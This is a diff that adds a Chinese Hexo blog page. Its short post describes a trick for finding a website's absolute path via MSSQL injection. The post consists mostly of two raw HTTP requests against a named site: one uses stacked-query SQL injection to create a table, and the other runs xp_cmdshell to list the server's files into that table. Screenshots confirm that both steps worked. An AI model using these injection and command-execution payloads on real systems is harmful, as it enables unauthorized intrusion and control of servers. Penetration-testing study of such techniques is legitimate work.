@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>mssql 获取网站绝对路径的一个小技巧 | Runtest</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="和同事学到的一个操作，记录一下。 步骤： 1 存在sql注入 创建表 GET /get.asp?act_id=52;create+table+gogotest+(tmp+varchar(1000));----&amp;amp;user_name=123 HTTP/1.1Host: 360gongfang.comConnection: closeCache-Control: max-age=0Upgrade">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mssql 获取网站绝对路径的一个小技巧">
+<meta property="og:url" content="http://yoursite.com/2020/05/06/mssql-获取网站绝对路径的一个小技巧/index.html">
+<meta property="og:site_name" content="Runtest">
+<meta property="og:description" content="和同事学到的一个操作，记录一下。 步骤： 1 存在sql注入 创建表 GET /get.asp?act_id=52;create+table+gogotest+(tmp+varchar(1000));----&amp;amp;user_name=123 HTTP/1.1Host: 360gongfang.comConnection: closeCache-Control: max-age=0Upgrade">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2020/05/06/EVPRwMjn7aNKd9G.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/06/jpgbihMvAz9KLPa.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/06/47AJntalbBFuHTL.png">
+<meta property="og:updated_time" content="2020-05-06T14:31:28.854Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mssql 获取网站绝对路径的一个小技巧">
+<meta name="twitter:description" content="和同事学到的一个操作，记录一下。 步骤： 1 存在sql注入 创建表 GET /get.asp?act_id=52;create+table+gogotest+(tmp+varchar(1000));----&amp;amp;user_name=123 HTTP/1.1Host: 360gongfang.comConnection: closeCache-Control: max-age=0Upgrade">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/06/EVPRwMjn7aNKd9G.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Runtest" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/default-avatar.jpg">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/highlight.css">
+  <script>
+  let antiquityStorage = window.sessionStorage.getItem('antiquitySessionStorage');
+  if (antiquityStorage == '' || antiquityStorage == null) {
+    var antiquityLoader = '<div id="loaderbox"><div class="loader"><div class="load-roll"><div class="load-top"></div><div class="load-right"></div><div class="load-bottom"></div></div></div></div>';
+    document.write(antiquityLoader);
+    document.body.style.overflow = 'hidden'
+  }
+  </script>
+</head>
+</html>
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" style="background-image: url(/images/test.jpg)" title="为了更安全的互联网">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-mssql-获取网站绝对路径的一个小技巧" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      mssql 获取网站绝对路径的一个小技巧
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2020/05/06/mssql-获取网站绝对路径的一个小技巧/" class="article-date">
+  <time datetime="2020-05-06T14:30:10.000Z" itemprop="datePublished">2020-05-06</time>
+</a>
+    
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>和同事学到的一个操作，记录一下。</p>
+<p>步骤：</p>
+<p><strong>1 存在sql注入</strong></p>
+<p>创建表</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /get.asp?act_id=52;create+table+gogotest+(tmp+varchar(1000));----&amp;user_name=123 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 360gongfang.com</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line"></span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line">Cookie: ASPSESSIONIDSCSRDDQC=EKFDMMLAFPMPKBFAPLIMPBKI</span><br></pre></td></tr></table></figure></div>
+
+<p>验证</p>
+<p><img src="https://i.loli.net/2020/05/06/EVPRwMjn7aNKd9G.png" alt="图片.png"></p>
+<p><strong>2 获取绝对路径</strong></p>
+<p>获取图片名</p>
+<p><img src="https://i.loli.net/2020/05/06/jpgbihMvAz9KLPa.png" alt="图片.png"></p>
+<p>写入图片路径</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /get.asp?act_id=52;insert+into+gogotest(tmp)+exec+master..xp_cmdshell+&apos;dir+/s+/b+d:\btns-search.png&apos;;----&amp;user_name=123 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 360gongfang.com</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line"></span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line"></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line">Cookie: ASPSESSIONIDSCSRDDQC=EKFDMMLAFPMPKBFAPLIMPBKI</span><br></pre></td></tr></table></figure></div>
+
+<p>验证：</p>
+<p><img src="https://i.loli.net/2020/05/06/47AJntalbBFuHTL.png" alt="图片.png"></p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2020/03/15/CVE-2020-1938复现和调试/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">CVE-2020-1938复现和调试</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    
+<div id="gitmentContainer"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/code-title.png" title="为了更安全的互联网"></img>
+    <h3 class="avatar-name">
+      
+        泰斯特
+      
+    </h3>
+    <p class="avatar-slogan">
+      搬砖工程师。
+    </p>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/05/06/mssql-获取网站绝对路径的一个小技巧/">mssql 获取网站绝对路径的一个小技巧</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/15/CVE-2020-1938复现和调试/">CVE-2020-1938复现和调试</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/04/菜鸡版java反序列化漏洞学习/">菜鸡版java反序列化漏洞学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/02/http协议走私实验/">http协议走私实验</a>
+          </li>
+        
+          <li>
+            <a href="/2020/02/11/Activity及Intent/">Activity及Intent</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+        <a style="display: block;" href="https://blog.ssssdl.xyz/" title target='_blank'
+        >ssssdl</a>
+      
+        <a style="display: block;" href="https://lingwu111.github.io/" title target='_blank'
+        >lingwu</a>
+      
+        <a style="display: block;" href="http://blog.0xccc.cc/" title target='_blank'
+        >canxiao</a>
+      
+        <a style="display: block;" href="http://www.vkxss.top/" title target='_blank'
+        >Vk</a>
+      
+        <a style="display: block;" href="https://syst1m.com/" title target='_blank'
+        >syst1m</a>
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2020 test &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
